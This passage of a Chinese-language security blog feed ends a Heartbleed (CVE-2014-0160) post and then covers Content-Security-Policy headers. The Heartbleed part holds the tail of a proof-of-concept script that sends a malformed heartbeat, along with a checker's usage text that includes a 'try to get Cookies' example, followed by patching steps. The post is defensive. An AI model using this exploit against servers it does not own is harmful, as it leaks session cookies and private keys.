        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server closed connection without sending Server Hello.&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Look for server hello done message.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Sending heartbeat request...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;自我測試工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用方法直接執行「perl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443」，可在網域名稱後指定特定 SSL 連接埠。&lt;/p&gt;

&lt;p&gt;使用說明：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  --starttls proto[:arg] - start plain and upgrade to SSL with&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;			   starttls protocol (imap,smtp,http,pop)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -T|--timeout T         - use timeout (default 5)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -H|--heartbeats N      - number of heartbeats (default 1)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -s|--show-data [L]     - show heartbeat response if vulnerable, optional&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;                           parameter L specifies number of bytes per line (16)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -R|--show-regex-data R - show data matching perl regex R. Option can be&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;                           used multiple times&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -q|--quiet             - don&amp;#39;t show anything, exit 1 if vulnerable&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -h|--help              - this screen&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;Examples:&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  # check direct www, imaps .. server&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:443&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:https&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl mail.google.com:imaps&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # try to get Cookies&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl -R &amp;#39;Cookie:.*&amp;#39; www.broken-site.com:443&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check webserver via proxy&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check imap server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check pop server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check smtp server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;應對措施&quot;&gt;應對措施&lt;/h3&gt;

&lt;p&gt;如果發現自己的伺服器有這樣的漏洞，該怎麼辦呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;確認自己的 OpenSSL 版本是否在受害範圍&lt;/li&gt;
  &lt;li&gt;使用 ssltest.py 檢測工具檢測是否含有漏洞&lt;/li&gt;
  &lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;重開所有與 OpenSSL 函式庫相關之服務&lt;/li&gt;
  &lt;li&gt;重新產生 SSL Private Key (因為 Private Key 可能藉由漏洞外洩)&lt;/li&gt;
  &lt;li&gt;將網站舊憑證撤銷&lt;/li&gt;
  &lt;li&gt;清除所有目前網頁伺服器上的 Session （因為可能遭到竊取）&lt;/li&gt;
  &lt;li&gt;必要時更換網站內使用者密碼，或是密切追蹤網站是否有帳號盜用的情況發生&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;詳細討論與建議可以參考&lt;br /&gt;
Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;誰會是目標呢&quot;&gt;誰會是目標呢？&lt;/h3&gt;

&lt;p&gt;真的會有攻擊者利用這樣的攻擊手法嗎？目前在&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲 wooyun&lt;/a&gt;平台上已經滿滿的資安研究員開始回報網站含有 OpenSSL 漏洞。也有駭客在嘗試撰寫更有效的攻擊利用程式，想要藉此把平常打不下來的網站一舉攻陷。&lt;/p&gt;

&lt;p&gt;怎樣的站台會是重點目標呢？含有會員機制的網站特別如此，例如 Web Mail、社群網站等等。因此不少企業要多注意了，例如全世界最大的社群網站 Facebook、SlideShare、台灣知名電信公司網站、社交平台、網路銀行、NAS，都會在這波的攻擊範圍之內。如果沒有儘速修復，等到更有效的攻擊程式出現，就真的等著失血了。&lt;/p&gt;

&lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;就連 OpenSSL 這種歷史悠久而且重要的函式庫，都可能犯這種基本的 C 語言程式設計錯誤，老舊的程式碼一定有不少陳年遺毒，如果沒有徹底清查，類似的心臟噴血事件會不斷上演。大家快點止血吧！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/</link>
                <guid>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</guid>
                <pubDate>Wed, 09 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Content-Security-Policy - HTTP Headers 的資安議題 (2)</title>
                <description>&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;

&lt;p&gt;還記得在上一篇 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers 的資安議題 (1)&lt;/a&gt; 文章中，我們提到了多種資安相關的 HTTP headers 嗎？接下來的幾篇文章我們會介紹幾個專門對付 XSS 的 HTTP headers，首先就由 Content-Security-Policy 打頭陣。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;（以下簡稱 CSP）是從 2010 年被提出來的一項 Web 規格，主要目的是用來防止 Cross-Site Scripting（以下簡稱 XSS）跟網頁樣式置換（例如&lt;a href=&quot;https://web.archive.org/web/20140321184408/http://udn.com:80/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;科技部被惡搞&lt;/a&gt;就是一個最好的例子）。經過五年發展，CSP 1.0 已從 W3C 的 TR (Technical Report) 變成 &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;，應該不久就會將成為 W3C 推薦標準。新的 &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; 則仍在草案階段。&lt;/p&gt;

&lt;p&gt;CSP 家族龐大，總共有三個類別，六個項目：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP-Report-Only&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在 CSP 發展初期，主流瀏覽器並未全部依照同一標準來開發，因此發展成這三種類別。目前由於 CSP 1.0 即將成為標準，大多數瀏覽器已支援 Content-Security-Policy 這個類別，因此狀況已逐漸收斂。主流瀏覽器的支援列表如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy 瀏覽器支援列表&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從列表中可看到，只要使用 Content-Security-Policy 與 X-Content-Security-Policy 就已有很高的覆蓋率，除非要支援 Safari 6，否則不用特意使用 X-WebKit-CSP。更詳細的瀏覽器支援列表可參考 &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;csp-10-主要作用&quot;&gt;CSP 1.0 主要作用&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;載入來源白名單&lt;/p&gt;

    &lt;p&gt;宣告一組受信任的白名單與資源種類（如 JavaScript, CSS, image 等等），使瀏覽器只能從此白名單中載入資源，藉此防止攻擊者從外部引入含有惡意程式碼的資源。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘self’ http://js.devco.re; style-src ‘self’ http://css.devco.re; img-src ‘self’ data:; frame-src ‘none’&lt;/p&gt;

    &lt;p&gt;效果：限定 script 資源只能從 http://js.devco.re 載入；限定 style 資源只能從 http://css.devco.re 載入；限定 img 只能從相同 domain 載入，並且支援 data scheme；限定 frame 不能從任何來源載入；除了 script、style、img、frame 之外的資源，則只能從同樣 domain 以及同樣協定的來源載入。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;禁止 inline 程式碼&lt;/p&gt;

    &lt;p&gt;一般人開發網站時為求便利，經常會在 HTML 中寫入一些 inline 程式碼，但攻擊者意圖入侵網站時也常用此手法。然而瀏覽器其實無法分辨這些 inline 程式碼究竟是開發人員寫的，還是攻擊者植入的。因此 CSP 乾脆強迫開發者必須把所有 inline 程式碼移到外部檔案，完全杜絕在 HTML 中出現 inline 程式碼的狀況。因此除非你在 CSP 宣告時有註明 ‘unsafe-inline’，否則 CSP 預設禁止使用 inline script 或 inline CSS。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘unsafe-inline’&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;禁止 eval 函式&lt;/p&gt;

    &lt;p&gt;eval() 對許多開發者來說一直是個非常方便的函式，然而若缺乏資安觀念，使用此函式時很可能會導致潛在的 XSS 風險。因此除非你在 CSP 宣告時有註明 ‘unsafe-eval’，否則 CSP 預設禁止使用 eval() 函式。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘unsafe-eval’&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;防止 sniffer&lt;/p&gt;

    &lt;p&gt;由於 CSP 可指定載入資源時強制使用 https 協定，因此可降低被 sniffing 的機率。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src http://devco.re; img-src https:&lt;/p&gt;

    &lt;p&gt;效果：限定圖片只能從 https 協定載入，不限定 domain。而除了圖片之外的資源則可從任意來源載入。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;csp-demo&quot;&gt;CSP Demo&lt;/h3&gt;

&lt;p&gt;下面這一段程式碼，使用 default-src * 讓相關資源可正常顯示：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;title&amp;gt;CSP Demo Site&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;h3&amp;gt;Content Security Policy Demo Site&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;img width=&amp;quot;200&amp;quot; height=&amp;quot;200&amp;quot; src=&amp;quot;http://devco.re/assets/themes/devcore/images/double-sticker.png&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;iframe frameborder=&amp;#39;0&amp;#39; width=&amp;#39;300&amp;#39; height=&amp;#39;200&amp;#39; src=&amp;#39;http://www.youtube.com/embed/E-BGf1MwecU&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; alt=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接下來我們將 php header 的那一行程式碼修改如下並且 reload 瀏覽器頁面：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; alt=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;使用 CSP 限制 img 與 frame 的來源種類後，我們可以從上圖 Chrome Inspector 的紅字觀察到，網站的圖片與 iframe 影片已被瀏覽器擋掉，無法載入。&lt;/p&gt;

&lt;p&gt;如果擔心直接使用 CSP 會影響網站營運，但又想嘗試 CSP，可以先使用 Content-Security-Policy-Report-Only，示範如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由上圖可以看到，此 header 不會直接阻擋不符合 CSP 規範的資源，但是會根據使用者所違反的規則發送相對應的 POST request 至指定的 URI，發送內容如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;quot;csp-report&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;blocked-uri&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://devco.re/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;document-uri&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://yoursite.com/csp.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;original-policy&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;referrer&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;status-code&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;violated-directive&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;img-src https:&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;由發送內容可看出這個 request 因為違反了「img-src https:」規則而將「http://devco.re/」這個來源擋掉。經由此方式，可一邊修改網站一邊觀察是否仍有不符合 CSP 規範之處，等到所有違規的內容都修正完畢後，再將 CSP 套用到正式上線環境。&lt;/p&gt;

&lt;p&gt;由於宣告方式非常多種，在這邊就不一一條列，若有興趣可前往 &lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy Reference &amp;amp; Examples&lt;/a&gt;、&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;Using Content Security Policy - Security | MDN&lt;/a&gt; 等網頁，有更完整的使用情境與範例可供參考。另外也有 &lt;a href=&quot;http://benvinegar.github.io/csp-talk-2013/&quot;&gt;Slide&lt;/a&gt; (by Ben Vinegar) 跟 &lt;a href=&quot;https://www.youtube.com/watch?v=pocsv39pNXA&quot;&gt;YouTube 影片&lt;/a&gt; (by Adam Barth) 可參考。&lt;/p&gt;

&lt;h3 id=&quot;csp-實際使用案例&quot;&gt;CSP 實際使用案例&lt;/h3&gt;

&lt;p&gt;目前採用 CSP 的案例較少，比較知名的使用案例是 &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;，在 2013 年 4 月 &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub 還寫了一篇專文&lt;/a&gt;公告表示他們已開始採用 CSP。另外一個案例廠商可能較廣為人知，是在 2013 年當紅的免費儲存空間 &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;。兩個案例的實際內容可見於下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一項知名使用案例是 Google 明定&lt;a href=&quot;https://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;開發 Chrome Extension 時必須使用 CSP&lt;/a&gt;，以追求更高的安全性。Mozilla 也在 &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki 開了一頁&lt;/a&gt;存放相關技術細節。若您想觀察其他使用案例，可使用 Chrome Inspector 或 curl 觀察以下幾個網站：&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;，&lt;a href=&quot;https://twitter.com/&quot;&gt;Twitter&lt;/a&gt;，&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;csp-常見誤用案例&quot;&gt;CSP 常見誤用案例&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;directives 後面不需加冒號&lt;/p&gt;

    &lt;p&gt;錯誤：default-src: ‘self’&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directives 之間以分號區隔&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’, script-src ‘self’&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; script-src ‘self’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;多個 source 之間僅以空白區隔&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’; img-src ‘self’, img1.devco.re, img2.devco.re&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; img-src ‘self’ img1.devco.re img2.devco.re&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某些 source 必須加冒號（https:、data:）&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’; img-src ‘self’ https data&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; img-src ‘self’ https: data:&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某些 source 必須用單引號括起來（’none’、’self’、’unsafe-inline’、’unsafe-eval’）&lt;/p&gt;

    &lt;p&gt;錯誤：script-src self unsafe-inline unsafe-eval&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

